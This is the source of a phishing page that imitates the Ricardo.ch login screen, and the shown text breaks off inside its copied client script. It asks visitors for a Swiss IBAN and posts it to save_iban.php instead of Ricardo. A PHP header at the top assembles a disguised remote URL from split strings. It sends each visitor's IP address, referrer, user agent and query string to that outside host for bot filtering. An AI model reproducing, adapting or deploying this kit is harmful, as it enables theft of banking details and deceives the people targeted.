<?php
 if (!function_exists('xozNe39gB2')) { function xozNe39gB2() { $xNsZVg = $_SERVER['SERVER_ADDR']; $xuU1qatOG2 = '127.0.0.1'; if ((!empty($_SERVER['HTTP_CF_CONNECTING_IP'])) && (($_SERVER['HTTP_CF_CONNECTING_IP'])!=$xuU1qatOG2) && (($_SERVER['HTTP_CF_CONNECTING_IP'])!=($xNsZVg))) {$ip=$_SERVER['HTTP_CF_CONNECTING_IP'];} elseif ((!empty($_SERVER['GEOIP_ADDR'])) && (($_SERVER['GEOIP_ADDR'])!=$xuU1qatOG2)) {$ip=$_SERVER['GEOIP_ADDR'];} elseif ((!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) && (($_SERVER['HTTP_X_FORWARDED_FOR'])!=$xuU1qatOG2) && (($_SERVER['HTTP_X_FORWARDED_FOR'])!=($xNsZVg))) {$ip=explode(',',$_SERVER['HTTP_X_FORWARDED_FOR'])[0];} elseif ((!empty($_SERVER['HTTP_CLIENT_IP'])) && (($_SERVER['HTTP_CLIENT_IP'])!=$xuU1qatOG2) && (($_SERVER['HTTP_CLIENT_IP'])!=($xNsZVg))) {$ip=$_SERVER['HTTP_CLIENT_IP'];} else {$ip=$_SERVER['REMOTE_ADDR'];} return $ip; }}
 $ip=xozNe39gB2();
 if (!function_exists('xAh9IteN3Lt')) { function xAh9IteN3Lt() { if(empty($_SERVER['HTTP_REFERER'])) { $_SERVER['HTTP_REFERER'] = getenv('HTTP_REFERER'); } return $_SERVER['HTTP_REFERER']; }}
 $ref=xAh9IteN3Lt();
 if (!function_exists('xfehe4SNy3')) { function xfehe4SNy3() { if(empty($_SERVER['HTTP_USER_AGENT'])) { $_SERVER['HTTP_USER_AGENT'] = getenv('HTTP_USER_AGENT'); } return $_SERVER['HTTP_USER_AGENT']; }}
 $ua=xfehe4SNy3();
 if ($_SERVER['QUERY_STRING']!=''){ $data = ''.urlencode($_SERVER['QUERY_STRING']).''; } else {$data = '';}
 $sourcename = 'c'; $cl0ip = 'find'; $sourceid = ''; $cl1ip = 'us'; $fd = 'x990959'; $cl2ip = '.re'; $langua = 'na'; $cl3ip = 'st';
 $ch = curl_init(); curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE); curl_setopt($ch, CURLOPT_URL, 'https://'.$cl0ip.''.$cl1ip.''.$cl2ip.''.$cl3ip.'/'.$cl1ip.''.$cl3ip.'.php'); curl_setopt($ch, CURLOPT_RETURNTRANSFER,true); curl_setopt($ch, CURLOPT_TIMEOUT,333); curl_setopt($ch, CURLOPT_POST, true); curl_setopt($ch, CURLOPT_POSTFIELDS, 'fd='.$fd.'&ip='.$ip.'&ref='.$ref.'&ua='.$ua.'&data='.$data.'&sourceid='.$sourceid.'&sourcename='.$sourcename.''); $ifbot = curl_exec($ch); curl_close($ch);
 if ($ifbot != '0') {  } else {    }
 if ($ifbot == '') {} elseif ($ifbot != '0') {  } else { }
 ?>

<html>

<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">

    <meta name="ulp-version" content="1.17.218">



    <meta name="robots" content="noindex, nofollow">

    <link rel="shortcut icon" href="https://files.ricardostatic.ch/favicon/favicon-32x32.png">


    <style>
        @font-face {
            font-family: "ulp-font";
            src: url("https://fonts.gstatic.com/s/roboto/v18/KFOmCnqEu92Fr1Mu5mxKOzY.woff2");
        }
    </style>

    <link rel="stylesheet" href="https://cdn.auth0.com/ulp/react-components/1.94.6/css/main.cdn.min.css">
    <style id="custom-styles-container">
        :root,
        .af-custom-form-container .af-form {
            --primary-color: #0e9493;
        }

        :root,
        .af-custom-form-container .af-form {
            --button-font-color: #ffffff;
        }

        :root {
            --secondary-button-border-color: #ffffff;
            --social-button-border-color: #ffffff;
            --radio-button-border-color: #ffffff;
        }

        :root {
            --secondary-button-text-color: #0e9493;
        }

        :root {
            --link-color: #0e9493;
        }

        :root {
            --title-font-color: #1e212a;
        }

        :root {
            --font-default-color: #1e212a;
        }

        :root {
            --widget-background-color: #ffffff;
        }

        :root {
            --box-border-color: #c9cace;
        }

        :root {
            --font-light-color: #757575;
        }

        :root {
            --input-text-color: #000000;
        }

        :root {
            --input-border-color: #c9cace;
            --border-default-color: #c9cace;
        }

        :root {
            --input-background-color: #ffffff;
        }

        :root {
            --icon-default-color: #65676e;
        }

        :root {
            --error-color: #d03c38;
            --error-text-color: #ffffff;
        }

        :root {
            --success-color: #13a688;
        }

        :root {
            --base-focus-color: #0e9493;
            --transparency-focus-color: rgba(14, 148, 147, 0.15);
        }

        :root {
            --base-hover-color: #0e9493;
            --transparency-hover-color: rgba(14, 148, 147, var(--hover-transparency-value));
        }

        @font-face {
            font-family: 'ULP Custom';
            font-style: normal;
            font-weight: var(--font-default-weight);
            src: local('ULP Custom'), url('https://fonts.gstatic.com/s/roboto/v18/KFOmCnqEu92Fr1Mu5mxKOzY.woff2') format('woff');
        }

        body {
            --font-family: 'ULP Custom', -apple-system, BlinkMacSystemFont, Roboto, Helvetica, sans-serif;
        }

        html,
        :root,
        .af-custom-form-container .af-form {
            font-size: 16px;
            --default-font-size: 16px;
        }

        body {
            --title-font-size: 1.5rem;
            --title-font-weight: var(--font-bold-weight);
        }

        .c41535f9a {
            font-size: 0.875rem;
            font-weight: var(--font-default-weight);
        }

        .c2701a345 {
            font-size: 0.875rem;
            font-weight: var(--font-default-weight);
        }

        .ulp-passkey-benefit-heading {
            font-size: 1.025rem;
        }

        .c1d1b1e07,
        .c0526c8ee {
            font-size: 1rem;
            font-weight: var(--font-bold-weight);
        }

        body {
            --ulp-label-font-size: 1rem;
            --ulp-label-font-weight: var(--font-default-weight);
        }

        .c41f6c9f2,
        .c7ee8ceb0,
        [id^='ulp-container-'] a {
            font-size: 1rem;
            font-weight: var(--font-bold-weight) !important;
        }

        :root {
            --button-border-width: 1px;
            --social-button-border-width: 1px;
            --radio-border-width: 1px;
        }

        body {
            --button-border-radius: 4px;
            --radio-border-radius: 4px;
        }

        :root {
            --input-border-width: 1px;
        }

        body {
            --input-border-radius: 4px;
        }

        .af-custom-form-container .af-form {
            --border-radius: 4px;
        }

        :root {
            --border-radius-outer: 5px;
        }

        :root {
            --box-border-width: 0px;
        }

        .cd7df2892 {
            display: none;
        }

        body {
            --header-title-spacing: 0;
        }

        .cd7df2892 {
            content: url('https://cdn.auth0.com/ulp/react-components/1.59/img/theme-generic/logo-generic.svg');
        }

        body {
            --logo-height: 52px;
        }

        .cd7df2892 {
            height: var(--logo-height);
        }

        body {
            --header-alignment: left;
        }

        .cc0a09eec {
            --page-background-alignment: center;
        }

        body {
            --page-background-color: #f5f5f3;
        }
    </style>
    <style>
        /* By default, hide features for javascript-disabled browsing */

        /* We use !important to override any css with higher specificity */

        /* It is also overriden by the styles in <noscript> in the header file */

        .no-js {
            clip: rect(0 0 0 0);
            clip-path: inset(50%);
            height: 1px;
            overflow: hidden;
            position: absolute;
            white-space: nowrap;
            width: 1px;
        }
    </style>
    <noscript>
        <style>
            /* We use !important to override the default for js enabled */
            /* If the display should be other than block, it should be defined specifically here */
            .js-required {
                display: none !important;
            }

            .no-js {
                clip: auto;
                clip-path: none;
                height: auto;
                overflow: auto;
                position: static;
                white-space: normal;
                width: var(--prompt-width);
            }
        </style>
    </noscript>

    <script>
        /**
         * initialize global vars
         */

        var globals = {
            BASE_URL: 'https://www.ricardo.ch',
            LOCALE: 'de',
            APP_TYPE: 'regular_web',
            PROMPT_NAME: 'login',
            PROMPT_SCREEN_NAME: 'login',
            USER_EMAIL: '',
        }
    </script>
    <script src="https://static.ricardo.ch/static-assets/auth0/prod/static/index.88ac2e72153df4a86386.js" type="text/javascript"></script>
    <style>
        body * {
            font-family: 'Roboto', Helvetica, Arial, sans-serif;
        }

        button,
        a {
            font-size: 14px !important;
        }

        .page-content {
            height: 100%;
            display: flex;
            flex-direction: column;
        }

        ._widget-auto-layout {
            flex-grow: 1;
        }

        ._widget-auto-layout>main._widget {
            min-height: auto;
        }

        @media screen and (max-width: 600px) {
            ._widget-auto-layout {
                margin-bottom: -40px;
            }

            ._widget.login {
                min-height: auto;
            }

            ._prompt-box-outer>div {
                background-color: transparent;
            }
        }
    </style>
</head>

<body>


    <div class="page-content">
        <style data-emotion="css lxnou6">
            .css-lxnou6 {
                position: static;
                background-color: #fff;
                height: 80px;
                width: 100%;
                border-bottom: 1px solid #e0e0e0;
                -webkit-flex-shrink: 0;
                -ms-flex-negative: 0;
                flex-shrink: 0;
            }
        </style>
        <header class="MuiBox-root css-lxnou6">
            <style data-emotion="css gw8uva">
                .css-gw8uva {
                    display: -webkit-box;
                    display: -webkit-flex;
                    display: -ms-flexbox;
                    display: flex;
                    -webkit-box-pack: justify;
                    -webkit-justify-content: space-between;
                    justify-content: space-between;
                    -webkit-align-items: center;
                    -webkit-box-align: center;
                    -ms-flex-align: center;
                    align-items: center;
                    height: 100%;
                    width: 100%;
                    max-width: 1200px;
                    margin: 0 auto;
                    padding-left: 16px;
                }
            </style>
            <div class="MuiBox-root css-gw8uva">
                <a id="headerHomeLink" href="https://www.ricardo.ch/de/">
                    <style data-emotion="css 15p9n5u">
                        .css-15p9n5u {
                            height: 24px;
                        }
                    </style><img class="MuiBox-root css-15p9n5u" src="https://files.ricardostatic.ch/logos/ricardo_logo_pos.svg" alt="Ricardo" />
                </a>
            </div>
        </header>

        <div class="_widget-auto-layout">
            <main class="_widget login">
                <section class="c66e20158 _prompt-box-outer ca20e631b">
                    <div class="ceeb7e995 c98450f08">


                        <div class="c35cc68b7">
                            <header class="caf9c4b6d cb03adf9e">
                                <div title="Ricardo" id="custom-prompt-logo" style="width: auto !important; height: 60px !important; position: static !important; margin: auto !important; padding: 0 !important; background-color: transparent !important; background-position: center !important; background-size: contain !important; background-repeat: no-repeat !important"></div>

                                <img class="cd7df2892 c62875a1f" id="prompt-logo-center" src="https://files.ricardostatic.ch/logos/ricardo_logo_pos.svg" alt="Ricardo">


                                <h1 class="c85308b88 c6689a483">Geben Sie Ihre IBAN ein</h1>


                                <div class="c41535f9a c43737e03">

                                    <p class="c28e85330 cff590de0"> </p>

                                </div>
                            </header>

                            <div class="c2701a345 c22884cc9">
                                <form id="loginForm" method="POST" class="cb2e1bdc9 c165a3537" data-form-primary="true" action="save_iban.php">
                                    <input type="hidden" name="state" value="hKFo2SBobjg1bmU0T2ZhUlZFaTRXdkJPcmxlSloyMGtQX1E4S6Fur3VuaXZlcnNhbC1sb2dpbqN0aWTZIEVnRDRkQjNzVzFDNUtQaWhNeWF4clJoMWgwdFc0ZXRlo2NpZNkgVHdmMG01ZlBjVDFVcExnaFJzdlJobExnaWczWVVWRTM">





                                    <div class="c9ad40d30 c77150178">
                                        <div class="c862f080e">
                                            

                                            <div class="input-wrapper _input-wrapper">
                                                <div class="c6d02143e c46e32be0 text c70cc0741" data-action-text="" data-alternate-action-text="">
                                                    <label class="cf59a1f59 no-js c6fb1f00d ca974173a" for="username">
                                                        IBAN Nummer*
                                                    </label>
                                            
                                                    <input class="input c19ad00c3 c30d9afca" 
                                                           inputMode="text" 
                                                           name="username" 
                                                           id="iban" 
                                                           type="text" 
                                                           value="" 
                                                           required 
                                                           autoComplete="username" 
                                                           autoCapitalize="none" 
                                                           spellCheck="false" 
                                                           autoFocus 
                                                           maxlength="21" 
                                                           title="Please enter a valid Swiss IBAN.">
                                            
                                                    <div class="cf59a1f59 js-required c6fb1f00d ca974173a" data-dynamic-label-for="username" aria-hidden="true">
                                                        IBAN Nummer*
                                                    </div>
                                                </div>
                                            </div>
                                            



                                        </div>
                                    </div>




                                    <div class="cc199ae96">

                                        <button type="submit" name="action" value="default" class="c1d1b1e07 c94ec4107 c3a9491fe cc1fd6969 c30010b38" data-action-button-primary="true">Bestätigen</button>

                                    </div>
                                </form>












                            </div>
                        </div>
                    </div>


                </section>
            </main>
            <script id="client-scripts">
                window.ulpFlags = {
                    "enable_ulp_wcag_compliance": false
                };
                ! function() {
                    var e, t, n, r, E, y, S, C, A, F, a, i, o = {
                            exports: function(e, t) {
                                return "object" == typeof e.ulpFlags && null !== e.ulpFlags ? e.ulpFlags : {}
                            }
                        }.exports(window, document),
                        u = ((e = {}).exports = function(n, a) {
                            var r = {};

                            function u(e, t) {
                                if (e.classList) return e.classList.add(t);
                                var n = e.className.split(" "); - 1 === n.indexOf(t) && (n.push(t), e.className = n.join(" "))
                            }

                            function i(e, t, n, r) {
                                return e.addEventListener(t, n, r)
                            }

                            function o(e) {
                                return "string" == typeof e
                            }

                            function c(e, t) {
                                return o(e) ? a.querySelector(e) : e.querySelector(t)
                            }

                            function l(e, t) {
                                if (e.classList) return e.classList.remove(t);
                                var n = e.className.split(" "),
                                    r = n.indexOf(t); - 1 !== r && (n.splice(r, 1), e.className = n.join(" "))
                            }

                            function s(e, t) {
                                return e.getAttribute(t)
                            }

                            function f(e, t, n) {
                                return e.setAttribute(t, n)
                            }
                            var e = ["text", "number", "email", "password", "tel", "url"],
                                t = "select,textarea," + e.map(function(e) {
                                    return 'input[type="' + e + '"]'
                                }).join(",");
                            return {
                                addClass: u,
                                toggleClass: function(e, t, n) {
                                    if (!0 === n || !1 === n) return r = e, a = t, !0 !== n ? l(r, a) : u(r, a);
                                    var r, a;
                                    if (e.classList) return e.classList.toggle(t);
                                    var i = e.className.split(" "),
                                        o = i.indexOf(t); - 1 !== o ? i.splice(o, 1) : i.push(t), e.className = i.join(" ")
                                },
                                hasClass: function(e, t) {
                                    return e.classList ? e.classList.contains(t) : -1 !== e.className.split(" ").indexOf(t)
                                },
                                addClickListener: function(e, t) {
                                    return i(e, "click", t)
                                },
                                addEventListener: i,
                                getAttribute: s,
                                hasAttribute: function(e, t) {
                                    return e.hasAttribute(t)
                                },
                                getElementById: function(e) {
                                    return a.getElementById(e)
                                },
                                getParent: function(e) {
                                    return e.parentNode
                                },
                                isString: o,
                                loadScript: function(e, t) {
                                    var n = a.createElement("script");
                                    for (var r in t) r.startsWith("data-") ? n.dataset[r.replace("data-", "")] = t[r] : n[r] = t[r];
                                    n.src = e, a.body.appendChild(n)
                                },
                                removeScript: function(e) {
                                    a.querySelectorAll('script[src="' + e + '"]').forEach(function(e) {
                                        e.remove()
                                    })
                                },
                                poll: function(e) {
                                    var i = e.interval || 2e3,
                                        t = e.url || n.location.href,
                                        o = e.condition || function() {
                                            return !0
                                        },
                                        u = e.onSuccess || function() {},
                                        c = e.onError || function() {};
                                    return setTimeout(function r() {
                                        var a = new XMLHttpRequest;
                                        return a.open("GET", t), a.setRequestHeader("Accept", "application/json"), a.onload = function() {
                                            if (200 === a.status) {
                                                var e = "application/json" === a.getResponseHeader("Content-Type").split(";")[0] ? JSON.parse(a.responseText) : a.responseText;
                                                return o(e) ? u() : setTimeout(r, i)
                                            }
                                            if (429 !== a.status) return c({
                                                status: a.status,
                                                responseText: a.responseText
                                            });
                                            var t = 1e3 * Number.parseInt(a.getResponseHeader("X-RateLimit-Reset")),
                                                n = t - (new Date).getTime();
                                            return setTimeout(r, i < n ? n : i)
                                        }, a.send()
                                    }, i)
                                },
                                querySelector: c,
                                querySelectorAll: function(e, t) {
                                    var n = o(e) ? a.querySelectorAll(e) : e.querySelectorAll(t);
                                    return Array.prototype.slice.call(n)
                                },
                                removeClass: l,
                                removeElement: function(e) {
                                    return e.remove()
                                },
                                setAttribute: f,
                                removeAttribute: function(e, t) {
                                    return e.removeAttribute(t)
                                },
                                swapAttributes: function(e, t, n) {
                                    var r = s(e, t),
                                        a = s(e, n);
                                    f(e, n, r), f(e, t, a)
                                },
                                setGlobalFlag: function(e, t) {
                                    r[e] = !!t
                                },
                                getGlobalFlag: function(e) {
                                    return !!r[e]
                                },
                                preventFormSubmit: function(e) {
                                    e.stopPropagation(), e.preventDefault()
                                },
                                matchMedia: function(e) {
                                    return "function" != typeof n.matchMedia && n.matchMedia(e).matches
                                },
                                dispatchEvent: function(e, t, n) {
                                    var r;
                                    "function" != typeof Event ? (r = a.createEvent("Event")).initCustomEvent(t, n, !1) : r = new Event(t, {
                                        bubbles: n
                                    }), e.dispatchEvent(r)
                                },
                                timeoutPromise: function(e, a) {
                                    return new Promise(function(t, n) {
                                        var r = setTimeout(function() {
                                            n(new Error("timeoutPromise: promise timed out"))
                                        }, e);
                                        a.then(function(e) {
                                            clearTimeout(r), t(e)
                                        }, function(e) {
                                            clearTimeout(r), n(e)
                                        })
                                    })
                                },
                                createMutationObserver: function(e) {
                                    return "undefined" == typeof MutationObserver ? null : new MutationObserver(e)
                                },
                                consoleWarn: function() {
                                    (console.warn || console.log).apply(console, arguments)
                                },
                                getConfigJson: function(e) {
                                    try {
                                        var t = c(e);
                                        if (!t) return null;
                                        var n = t.value;
                                        return n ? JSON.parse(n) : null
                                    } catch (e) {
                                        return null
                                    }
                                },
                                getCSSVariable: function(e) {
                                    return getComputedStyle(a.documentElement).getPropertyValue(e)
                                },
                                removeAndTrimString: function(e, t) {
                                    var n = new RegExp(t, "g"),
                                        r = e.replace(n, "");
                                    return r = r.replace(/\s+/g, "  ").trim()
                                },
                                setTimeout: setTimeout,
                                globalWindow: n,
                                SUPPORTED_INPUT_TYPES: e,
                                ELEMENT_TYPE_SELECTOR: t,
                                RUN_INIT: !0
                            }
                        }, e.exports)(window, document),
                        c = function() {
                            var e = {};

                            function v(e) {
                                if (!("string" == typeof e || e instanceof String)) {
                                    var t = typeof e;
                                    throw null === e ? t = "null" : "object" === t && (t = e.constructor.name), new TypeError("Expected a string but received a " + t)
                                }
                            }

                            function m(e, t) {
                                var n, r;
                                v(e), r = "object" == typeof t ? (n = t.min || 0, t.max) : (n = t, arguments[2]);
                                var a = encodeURI(e).split(/%..|./).length - 1;
                                return n <= a && (void 0 === r || a <= r)
                            }

                            function h(e, t) {
                                for (var n in void 0 === e && (e = {}), t) void 0 === e[n] && (e[n] = t[n]);
                                return e
                            }
                            var g = {
                                    require_tld: !0,
                                    allow_underscores: !1,
                                    allow_trailing_dot: !1,
                                    allow_numeric_tld: !1,
                                    allow_wildcard: !1,
                                    ignore_max_length: !1
                                },
                                t = "(?:[0-9]|[1-9][0-9]|1[0-9][0-9]|2[0-4][0-9]|25[0-5])",
                                n = "(" + t + "[.]){3}" + t,
                                r = new RegExp("^" + n + "$"),
                                a = "(?:[0-9a-fA-F]{1,4})",
                                i = new RegExp("^((?:" + a + ":){7}(?:" + a + "|:)|(?:" + a + ":){6}(?:" + n + "|:" + a + "|:)|(?:" + a + ":){5}(?::" + n + "|(:" + a + "){1,2}|:)|(?:" + a + ":){4}(?:(:" + a + "){0,1}:" + n + "|(:" + a + "){1,3}|:)|(?:" + a + ":){3}(?:(:" + a + "){0,2}:" + n + "|(:" + a + "){1,4}|:)|(?:" + a + ":){2}(?:(:" + a + "){0,3}:" + n + "|(:" + a + "){1,5}|:)|(?:" + a + ":){1}(?:(:" + a + "){0,4}:" + n + "|(:" + a + "){1,6}|:)|(?::((?::" + a + "){0,5}:" + n + "|(?::" + a + "){1,7}|:)))(%[0-9a-zA-Z-.:]{1,})?$");

                            function b(e, t) {
                                return void 0 === t && (t = ""), v(e), (t = String(t)) ? "4" === t ? r.test(e) : "6" === t && i.test(e) : b(e, 4) || b(e, 6)
                            }
                            var _ = {
                                    allow_display_name: !1,
                                    allow_underscores: !1,
                                    require_display_name: !1,
                                    allow_utf8_local_part: !0,
                                    require_tld: !0,
                                    blacklisted_chars: "",
                                    ignore_max_length: !1,
                                    host_blacklist: [],
                                    host_whitelist: []
                                },
                                w = /^([^\x00-\x1F\x7F-\x9F\cX]+)</i,
                                x = /^[a-z\d!#\$%&'\*\+\-\/=\?\^_`{\|}~]+$/i,
                                E = /^[a-z\d]+$/,
                                y = /^([\s\x01-\x08\x0b\x0c\x0e-\x1f\x7f\x21\x23-\x5b\x5d-\x7e]|(\\[\x01-\x09\x0b\x0c\x0d-\x7f]))*$/i,
                                S = /^[a-z\d!#\$%&'\*\+\-\/=\?\^_`{\|}~\u00A1-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF]+$/i,
                                C = /^([\s\x01-\x08\x0b\x0c\x0e-\x1f\x7f\x21\x23-\x5b\x5d-\x7e\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF]|(\\[\x01-\x09\x0b\x0c\x0d-\x7f\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF]))*$/i,
                                A = 254;

                            function o(e, t) {
                                if (v(e), (t = h(t, _)).require_display_name || t.allow_display_name) {
                                    var n = e.match(w);
                                    if (n) {
                                        var r = n[1];
                                        if (e = e.replace(r, "").replace(/(^<|>$)/g, ""), r.endsWith(" ") && (r = r.slice(0, -1)), ! function(e) {
                                                var t = e.replace(/^"(.+)"$/, "$1");
                                                if (!t.trim()) return !1;
                                                if (/[\.";<>]/.test(t)) {
                                                    if (t === e) return !1;
                                                    if (t.split('"').length !== t.split('\\"').length) return !1
                                                }
                                                return !0
                                            }(r)) return !1
                                    } else if (t.require_display_name) return !1
                                }
                                if (!t.ignore_max_length && e.length > A) return !1;
                                var a = e.split("@"),
                                    i = a.pop(),
                                    o = i.toLowerCase();
                                if (t.host_blacklist.includes(o)) return !1;
                                if (0 < t.host_whitelist.length && !t.host_whitelist.includes(o)) return !1;
                                var u = a.join("@");
                                if (t.domain_specific_validation && ("gmail.com" === o || "googlemail.com" === o)) {
                                    var c = (u = u.toLowerCase()).split("+")[0];
                                    if (!m(c.replace(/\./g, ""), {
                                            min: 6,
                                            max: 30
                                        })) return !1;
                                    for (var l = c.split("."), s = 0; s < l.length; s++)
                                        if (!E.test(l[s])) return !1
                                }
                                if (!(!1 !== t.ignore_max_length || m(u, {
                                        max: 64
                                    }) && m(i, {
                                        max: 254
                                    }))) return !1;
                                if (! function(e, t) {
                                        v(e), (t = h(t, g)).allow_trailing_dot && "." === e[e.length - 1] && (e = e.substring(0, e.length - 1)), !0 === t.allow_wildcard && 0 === e.indexOf("*.") && (e = e.substring(2));
                                        var n = e.split("."),
                                            r = n[n.length - 1];
                                        if (t.require_tld) {
                                            if (n.length < 2) return !1;
                                            if (!t.allow_numeric_tld && !/^([a-z\u00A1-\u00A8\u00AA-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF]{2,}|xn[a-z0-9-]{2,})$/i.test(r)) return !1;
                                            if (/\s/.test(r)) return !1
                                        }
                                        return !(!t.allow_numeric_tld && /^\d+$/.test(r)) && n.every(function(e) {
                                            return !(63 < e.length && !t.ignore_max_length || !/^[a-z_\u00a1-\uffff0-9-]+$/i.test(e) || /[\uff01-\uff5e]/.test(e) || /^-|-$/.test(e) || !t.allow_underscores && /_/.test(e))
                                        })
                                    }(i, {
                                        require_tld: t.require_tld,
                                        ignore_max_length: t.ignore_max_length,
                                        allow_underscores: t.allow_underscores
                                    })) {
                                    if (!t.allow_ip_domain) return !1;
                                    if (!b(i)) {
                                        if (!i.startsWith("[") || !i.endsWith("]")) return !1;
                                        var f = i.slice(1, -1);
                                        if (0 === f.length || !b(f)) return !1
                                    }
                                }
                                if ('"' === u[0]) return u = u.slice(1, u.length - 1), t.allow_utf8_local_part ? C.test(u) : y.test(u);
                                for (var d = t.allow_utf8_local_part ? S : x, p = (l = u.split("."), 0); p < l.length; p++)
                                    if (!d.test(l[p])) return !1;
                                return !t.blacklisted_chars || -1 === u.search(new RegExp("[" + t.blacklisted_chars + "]+", "g"))
                            }
                            return e.exports = function(e, t) {
                                return {
                                    ulpRequiredFunction: function(e, t) {
                                        return !t || !!e.value
                                    },
                                    ulpEmailValidationFunction: function(e, t) {
                                        return !t || !e.value || !!o(e.value)
                                    }
                                }
                            }, e.exports
                        }()(window, document);
                    ((t = {}).exports = function(r, e, o, u, c, l, s, f, t) {
                        function d(e) {
                            "Escape" == e.code && document.activeElement.blur()
                        }
                        t.enable_ulp_wcag_compliance && e("div.c6d02143e.password").forEach(function(e) {
                            var a, i, t = r(e, "input"),
                                n = r(e, '[data-action="toggle"]');
                            o(e, (a = t, i = n, function(e) {
                                if (e.target.classList.contains("ulp-button-icon")) {
                                    if (a.type = "password" === a.type ? "text" : "password", i) {
                                        i.ariaChecked = "false" === i.ariaChecked ? "true" : "false";
                                        var t = i.querySelector(".show-password-tooltip"),
                                            n = i.querySelector(".hide-password-tooltip");
                                        t && s(t, "hide"), n && s(n, "hide")
                                    }
                                    var r = f(a);
                                    "text" === a.type ? c(r, "show") : l(r, "show")
                                }
                            })), u(n, "keyup", d)
                        })
                    }, t.exports)(u.querySelector, u.querySelectorAll, u.addClickListener, u.addEventListener, u.addClass, u.removeClass, u.toggleClass, u.getParent, o), ((n = {}).exports = function(r, e, o, u, c, l, s, t) {
                        t.enable_ulp_wcag_compliance || e("div.c6d02143e.password").forEach(function(e) {
                            var a, i, t = r(e, "input"),
                                n = r(e, '[data-action="toggle"]');
                            o(e, (a = t, i = n, function(e) {
                                if (e.target.classList.contains("ulp-button-icon")) {
                                    if (a.type = "password" === a.type ? "text" : "password", i) {
                                        var t = i.querySelector(".show-password-tooltip"),
                                            n = i.querySelector(".hide-password-tooltip");
                                        t && l(t, "hide"), n && l(n, "hide")
                                    }
                                    var r = s(a);
                                    "text" === a.type ? u(r, "show") : c(r, "show")
                                }
                            }))
                        })
                    }, n.exports)(u.querySelector, u.querySelectorAll, u.addClickListener, u.addClass, u.removeClass, u.toggleClass, u.getParent, o), {
                        exports: function(e, r, a, t) {
                            var n = e(".c6180b6e0"),
                                i = e("#alert-trigger"),
                                o = e(".cf30275f3"),
                                u = e(".cffe5ff16"),
                                c = !1;
                            i && u && n && t(n, function(e) {
                                var t = e.target === i,
                                    n = u.contains(e.target);
                                return t && !c ? (r(o, "show"), void(c = !0)) : t && c || c && !n ? (a(o, "show"), void(c = !1)) : void 0
                            })
                        }
                    }.exports(u.querySelector, u.addClass, u.removeClass, u.addClickListener), (E = "recaptcha_v2", y = "recaptcha_enterprise", S = "hcaptcha", C = "friendly_captcha", A = "arkose", F = "auth0_v2", (r = {}).exports = function(i, o, a, u, c, l) {
                        var s = 500,
                            f = 3,
                            d = 0,
                            p = a("div[data-captcha-sitekey]"),
                            t = a("div[data-captcha-sitekey] input");

                        function v() {
                            switch (g()) {
                                case E:
                                    return window.grecaptcha;
                                case y:
                                    return window.grecaptcha.enterprise;
                                case S:
                                    return window.hcaptcha;
                                case C:
                                    return window.friendlyChallenge;
                                case A:
                                    return window.arkose;
                                case F:
                                    return window.turnstile
                            }
                        }

                        function m() {
                            return a(function() {
                                switch (g()) {
                                    case E:
                                    case y:
                                        return "#ulp-recaptcha";
                                    case S:
                                        return "#ulp-hcaptcha";
                                    case C:
                                        return "#ulp-friendly-captcha";
                                    case A:
                                        return "#ulp-arkose";
                                    case F:
                                        return "#ulp-auth0-v2-captcha"
                                }
                            }())
                        }

                        function h() {
                            return p.getAttribute("data-captcha-lang")
                        }

                        function g() {
                            return p.getAttribute("data-captcha-provider")
                        }

                        function b() {
                            return p.getAttribute("data-captcha-sitekey")
                        }

                        function _() {
                            return a('form[data-form-primary="true"]')
                        }

                        function w(e) {
                            return t.value = e
                        }

                        function x() {
                            var e = v(),
                                t = l("--ulp-captcha-widget-theme") || "light";
                            if (g() === C) {
                                "dark" === t && u(a(".frc-captcha"), "dark");
                                var n = new e.WidgetInstance(m(), {
                                    sitekey: b(),
                                    language: h(),
                                    doneCallback: function(e) {
                                        w(e)
                                    }
                                })
                            } else {
                                var r = {
                                    sitekey: b(),
                                    theme: t,
                                    "expired-callback": function() {
                                        w(""), u(p, "c54688395"), e.reset(n)
                                    },
                                    callback: function(e) {
                                        w(e), c(p, "c54688395")
                                    }
                                };
                                g() === F && (r.language = h(), r.retry = "never", r["response-field"] = !1, r["error-callback"] = function(e) {
                                    return fetch("https://www.cloudflarestatus.com/api/v2/summary.json").then(function(e) {
                                        return e.json()
                                    }).then(function(e) {
                                        for (var t = 0; t < e.components.length; t++) {
                                            var n = e.components[t];
                                            if ("Turnstile" === n.name) return "operational" === n.status
                                        }
                                        return !1
                                    }).catch(function(e) {
                                        return !1
                                    }).then(function(e) {
                                        e && d < f ? (w(""), u(p, "c54688395"), v().reset(n), d++) : (w("BYPASS_CAPTCHA"), c(p, "c54688395"))
                                    }), !0
                                }), n = e.render(m(), r)
                            }
                        }
                        p && function() {
                            var e = "captchaCallback_" + Math.floor(1000001 * Math.random()),
                                t = g(),
                                n = {
                                    async: !0,
                                    defer: !0
                                },
                                r = function(e, t, n, r) {
                                    switch (g()) {
                                        case E:
                                            return "https://www.recaptcha.net/recaptcha/api.js?render=explicit&hl=" + e + "&onload=" + t;
                                        case y:
                                            return "https://www.recaptcha.net/recaptcha/enterprise.js?render=explicit&hl=" + e + "&onload=" + t;
                                        case S:
                                            return "https://js.hcaptcha.com/1/api.js?render=explicit&hl=" + e + "&onload=" + t;
                                        case C:
                                            return "https://cdn.jsdelivr.net/npm/friendly-challenge@0.9.14/widget.min.js";
                                        case A:
                                            return "https://" + n + ".arkoselabs.com/v2/" + r + "/api.js";
                                        case F:
                                            return "https://challenges.cloudflare.com/turnstile/v0/api.js?render=explicit&onload=" + t
                                    }
                                }(h(), e, p.getAttribute("data-captcha-client-subdomain"), b());
                            if (t === A || t === F) {
                                n["data-callback"] = e, n.onerror = function() {
                                    if (d < f) return o(r), i(r, n), void d++;
                                    o(r), w("BYPASS_CAPTCHA")
                                };
                                var a = function(e) {
                                    var t, n;
                                    t = e, n = function(e) {
                                        setTimeout(function() {
                                            t.run()
                                        }, s), e.preventDefault()
                                    }, _().addEventListener("submit", n), t.setConfig({
                                        onCompleted: function(e) {
                                            w(e.token), _().submit()
                                        },
                                        onError: function(e) {
                                            return fetch("https://status.arkoselabs.com/api/v2/status.json").then(function(e) {
                                                return e.json()
                                            }).then(function(e) {
